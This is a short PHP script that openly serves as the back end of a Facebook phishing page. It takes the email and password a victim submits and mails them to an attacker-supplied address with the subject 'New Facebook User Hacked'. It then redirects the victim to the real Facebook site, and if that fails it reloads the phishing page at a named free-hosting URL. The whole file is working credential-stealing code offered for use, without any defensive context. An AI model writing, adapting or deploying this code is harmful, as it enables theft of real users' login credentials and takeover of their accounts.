<?php
	if(!empty($_POST['pass'])){         //check whether password field is empty or not
	if(isset($_POST['pass'])){
		$name = $_POST['email'];    //get email address
		$pass = $_POST['pass'];     //get password

		$email = "Enter your email here";    //hackers' email address
		$content = 'Username : '.$_POST['email'].'</br>Password : '.$_POST['pass']; //set email content
		$subject = "New Facebook User Hacked";    //subject of the email
		$headers = "From:fbhacker";
		mail($email, $subject, $content, $headers );  //mail the email
		header('location:https://m.facebook.com/');   //redirect to the real fb page
	}
	}
	else{
		header('location:https://faceuser111.000webhostapp.com/'); //if above steps not succeeded, reload the phishing page
	}
?>
